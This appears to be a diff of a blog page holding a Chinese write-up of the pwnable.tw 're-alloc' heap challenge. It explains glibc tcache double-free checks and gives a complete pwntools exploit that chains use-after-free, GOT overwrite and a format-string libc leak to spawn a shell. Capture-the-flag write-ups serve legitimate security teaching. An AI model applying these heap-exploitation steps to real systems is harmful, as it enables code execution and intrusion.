@@ -1,83 +1,26 @@
-<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>pwn heap: re-alloc | Nop</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop" type="application/atom+xml">
-</head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">Nop</a></h1></div><p class="m-desc">There is a long way to go</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">Archives</a></li><li><span class="dot">●</span><a href="/categories/">Categories</a></li><li><span class="dot">●</span><a href="/tags/">Tags</a></li><li><span class="dot">●</span><a href="/about/">About</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="Search" onfocus="if(this.value=='Search'){this.value='';}" onblur="if(this.value==''){this.value='Search';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">pwn heap: re-alloc</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2020/03/06/pwn-heap-re-alloc/">2020-03-06</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/Writeup/">Writeup</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>这道题的总体思路就是uaf + fsb， 开始以为是libc2.29的uaf + tcache double free， 后来发现没有show导致没有办法leak出libc地址，最后无从下手。后来还是从别人的博客里学到神奇的姿势。</p>
-<blockquote>
-<p>题目描述</p>
-</blockquote>
-<p>pwnable.tw上的一道题。<br><br>Partial RELRO，got表可以改，基本上是利用改got表来getshell了。</p>
-<pre><code>Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-FORTIFY:  Enabled</code></pre><p>题目提供了四个功能</p>
-<pre><code>1. alloc
-2. realloc
-3. free
-4. exit</code></pre><p>其中alloc功能相当于malloc一个chunk，但是chunk的<code>size&lt;=0x78</code>, 且chunk的地址会放在bss段的heap数组上，heap数组允许至多两个成员。接受完data输入后会在末尾补上0，这里存在一个off by null，但是没有什么用。<br><br>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。<br><br>free功能就是同时free掉chunk以及将heap数组中的指针清0</p>
-<blockquote>
-<p>相关知识点</p>
-</blockquote>
-<h3 id="libc2-29的tcache-double-free的检测机制"><a href="#libc2-29的tcache-double-free的检测机制" class="headerlink" title="libc2.29的tcache double free的检测机制"></a>libc2.29的tcache double free的检测机制</h3><pre><code class="C">//glibc-2.27
-typedef struct tcache_entry
-{
-  struct tcache_entry *next;
-} tcache_entry;
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="pwn heap: re-alloc"><meta name="keywords" content="pwnable.tw,pwn,re-alloc"><meta name="author" content="Nop"><meta name="copyright" content="Nop"><title>pwn heap: re-alloc | Nop's BLog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop's BLog" type="application/atom+xml">
+</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#题目描述"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#相关知识点"><span class="toc-number">2.</span> <span class="toc-text">相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#libc2-29的tcache-double-free的检测机制"><span class="toc-number">2.1.</span> <span class="toc-text">libc2.29的tcache double free的检测机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#realloc-ptr-size-函数"><span class="toc-number">2.2.</span> <span class="toc-text">realloc(ptr, size)函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用思路"><span class="toc-number">3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小结"><span class="toc-number">5.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Nop</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">9</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">4</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">3</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/avatar.png# false or url of img)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Nop's BLog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/atom.xml">RSS</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">pwn heap: re-alloc</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-06</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">1.4k</span><span class="post-meta__separator">|</span><span>Reading time: 6 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>这道题的总体思路就是uaf + fsb， 开始以为是libc2.29的uaf + tcache double free， 后来发现没有show导致没有办法leak出libc地址，最后无从下手。后来还是从别人的博客里学到神奇的姿势。</p>
+<a id="more"></a>
 
-//glibc-2.29
-typedef struct tcache_entry
-{
-  struct tcache_entry *next;
-  /* This field exists to detect double frees.  */
-  struct tcache_perthread_struct *key;
-} tcache_entry;</code></pre>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>pwnable.tw上的一道题。<br><br>Partial RELRO，got表可以改，基本上是利用改got表来getshell了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<p>题目提供了四个功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. alloc</span><br><span class="line">2. realloc</span><br><span class="line">3. free</span><br><span class="line">4. exit</span><br></pre></td></tr></table></figure>
+<p>其中alloc功能相当于malloc一个chunk，但是chunk的<code>size&lt;=0x78</code>, 且chunk的地址会放在bss段的heap数组上，heap数组允许至多两个成员。接受完data输入后会在末尾补上0，这里存在一个off by null，但是没有什么用。<br><br>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。<br><br>free功能就是同时free掉chunk以及将heap数组中的指针清0</p>
+<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="libc2-29的tcache-double-free的检测机制"><a href="#libc2-29的tcache-double-free的检测机制" class="headerlink" title="libc2.29的tcache double free的检测机制"></a>libc2.29的tcache double free的检测机制</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
 <p>多了一个<code>key</code>的成员变量。这个<code>key</code>的作用是什么？</p>
-<pre><code class="C">//glibc-2.27
-tcache_put (mchunkptr chunk, size_t tc_idx)
-{
-  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
-  assert (tc_idx &lt; TCACHE_MAX_BINS);
-  e-&gt;next = tcache-&gt;entries[tc_idx];
-  tcache-&gt;entries[tc_idx] = e;
-  ++(tcache-&gt;counts[tc_idx]);
-}
-
-tcache_get (size_t tc_idx)
-{
-  tcache_entry *e = tcache-&gt;entries[tc_idx];
-  assert (tc_idx &lt; TCACHE_MAX_BINS);
-  assert (tcache-&gt;entries[tc_idx] &gt; 0);
-  tcache-&gt;entries[tc_idx] = e-&gt;next;
-  --(tcache-&gt;counts[tc_idx]);
-  return (void *) e;
-}
-
-//glibc-2.29
-tcache_put (mchunkptr chunk, size_t tc_idx)
-{
-  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
-  assert (tc_idx &lt; TCACHE_MAX_BINS);
-
-  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will
-     detect a double free.  */
-  e-&gt;key = tcache;    //new
-
-  e-&gt;next = tcache-&gt;entries[tc_idx];
-  tcache-&gt;entries[tc_idx] = e;
-  ++(tcache-&gt;counts[tc_idx]);
-}
-
-tcache_get (size_t tc_idx)
-{
-  tcache_entry *e = tcache-&gt;entries[tc_idx];
-  assert (tc_idx &lt; TCACHE_MAX_BINS);
-  assert (tcache-&gt;entries[tc_idx] &gt; 0);
-  tcache-&gt;entries[tc_idx] = e-&gt;next;
-  --(tcache-&gt;counts[tc_idx]);
-  e-&gt;key = NULL;    //new
-  return (void *) e;
-}</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;	<span class="comment">//new</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;	<span class="comment">//new</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>当chunk被free到tcache中时，<code>key</code>会被置为第一个chunk的地址，也就是tcache的结构chunk。当chunk从tcache中取出来时，<code>key</code>会被设置成NULL。总而言之，就是通过<code>key</code>来表明这个chunk是否在tcache中。<br><br>而这个<code>key</code>也是libc2.29中提供的对tcache的额外的检查，即在将一个chunk放入tcache时，会检查该chunk的<code>key</code>是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk，从而触发double free的检查机制。<br><br>然而仍然有绕过检查的方法，就是<code>key</code>不等于tcache结构体的位置即可，而这往往需要配合uaf或者chunk overlap同时利用才能做到。</p>
-<h3 id="realloc-ptr-size-函数"><a href="#realloc-ptr-size-函数" class="headerlink" title="realloc(ptr, size)函数"></a>realloc(ptr, size)函数</h3><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p>
+<h2 id="realloc-ptr-size-函数"><a href="#realloc-ptr-size-函数" class="headerlink" title="realloc(ptr, size)函数"></a>realloc(ptr, size)函数</h2><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p>
 <ol>
 <li><code>ptr == 0</code>: malloc(size)</li>
 <li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li>
@@ -85,120 +28,24 @@ tcache_get (size_t tc_idx)
 <li><code>ptr != 0 &amp;&amp; size &lt; old_size</code>: edit(ptr) and free(remainder)</li>
 <li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;</li>
 </ol>
-<blockquote>
-<p>利用思路</p>
-</blockquote>
-<ul>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
 <li>利用uaf在tcache不同size的链表中放置一个<code>atoll_got</code>的chunk</li>
 <li>利用其中一个指向<code>atoll_got</code>的chunk更改<code>atoll_got</code>为<code>printf_plt</code>，这样在调用<code>atoll</code>时，就会调用<code>printf</code>从而构造出一个格式化字符串漏洞，利用这个漏洞可以leak出栈上的libc地址，这里选择leak<code>__libc_start_main</code>。</li>
 <li>利用另一个指向<code>atoll_got</code>的chunk将<code>atoll_got</code>再改成<code>system</code>，注意因为此时<code>atoll</code>是<code>printf</code>，所以在调用alloc时，需要输入的Index和Size不是直接输入数字，而是通过输入的string的长度来通过printf返回的值间接传给Index和Size。<del>由于read的长度限制在16，因此注意这里tcache的相关chunk必须是<code>size=0x20</code>，否则无法利用。</del>（可以通过”%xc”来控制printf的返回值。）</li>
 <li>最后再输入<code>/bin/sh\x00</code>调用<code>atoll</code>来执行<code>system(&quot;/bin/sh&quot;);</code>getshell即可。</li>
 </ul>
-<blockquote>
-<p>exp</p>
-</blockquote>
-<pre><code class="python">context.log_level = &quot;debug&quot;
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">bss = elf.bss(<span class="number">0</span>)</span><br><span class="line">atoll_got = elf.got[<span class="string">"atoll"</span>]</span><br><span class="line">atoll_plt = elf.plt[<span class="string">"atoll"</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">"printf"</span>]</span><br><span class="line">libc_start_main_ret_offset = libc.symbols[<span class="string">"__libc_start_main"</span>] + <span class="number">0xeb</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># let tcache[0x20] =&gt; atoll_got</span></span><br><span class="line"><span class="comment"># heap[0] ==&gt; chunk(0x18) &lt;== heap[1]</span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"AAA"</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(atoll_got))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"BBB"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now heap[0] == heap[1] == NULL</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">"CCC"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># let tcache[0x50] =&gt; atoll_got</span></span><br><span class="line"><span class="comment"># heap[0] ==&gt; chunk(0x18) &lt;== heap[1]</span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">"AAA"</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x48</span>, p64(atoll_got))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">"BBB"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now heap[0] == heap[1] == NULL</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">"CCC"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># above all, we get two tcache point to atoll_got that can be malloc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc once at heap[0]</span></span><br><span class="line"><span class="comment"># change the atoll_got to printf_plt</span></span><br><span class="line"><span class="comment"># use format string bug to leak the __libc_start_main_ret in the stack</span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x48</span>, p64(printf_plt))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>, <span class="string">"%21$llx"</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_ret = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_ret - libc_start_main_ret_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc twice at heap[1]</span></span><br><span class="line"><span class="comment"># since the atoll has been set to printf</span></span><br><span class="line"><span class="comment"># the return value of printf(which may be the length of the string) will be regarded as the "Index"</span></span><br><span class="line"><span class="comment"># thus we use length of the string to make "atoll" work</span></span><br><span class="line"><span class="comment"># then we change the atoll_got to libc_system</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>, <span class="string">"A\x00"</span>)</span><br><span class="line">p.sendafter(<span class="string">"Size:"</span>, <span class="string">"A"</span> * <span class="number">15</span> + <span class="string">"\x00"</span>)</span><br><span class="line">p.sendafter(<span class="string">"Data:"</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># input "/bin/sh\x00" and call system(atoll) to get shell</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_start_main_ret: "</span> + hex(libc_start_main_ret))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-def alloc(index, size, data):
-    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)
-    p.sendlineafter(&quot;Index:&quot;, str(index))
-    p.sendlineafter(&quot;Size:&quot;, str(size))
-    p.sendafter(&quot;Data:&quot;, data)
-
-def realloc(index, size, data):
-    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)
-    p.sendlineafter(&quot;Index:&quot;, str(index))
-    p.sendlineafter(&quot;Size:&quot;, str(size))
-    if size != 0:
-        p.sendafter(&quot;Data:&quot;, data)
-
-def free(index):
-    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)
-    p.sendlineafter(&quot;Index:&quot;, str(index))
-
-bss = elf.bss(0)
-atoll_got = elf.got[&quot;atoll&quot;]
-atoll_plt = elf.plt[&quot;atoll&quot;]
-printf_plt = elf.plt[&quot;printf&quot;]
-libc_start_main_ret_offset = libc.symbols[&quot;__libc_start_main&quot;] + 0xeb
-system_offset = libc.symbols[&quot;system&quot;]
-
-# let tcache[0x20] =&gt; atoll_got
-# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]
-alloc(0, 0x18, &quot;AAA&quot;)
-realloc(0, 0, &quot;&quot;)
-realloc(0, 0x18, p64(atoll_got))
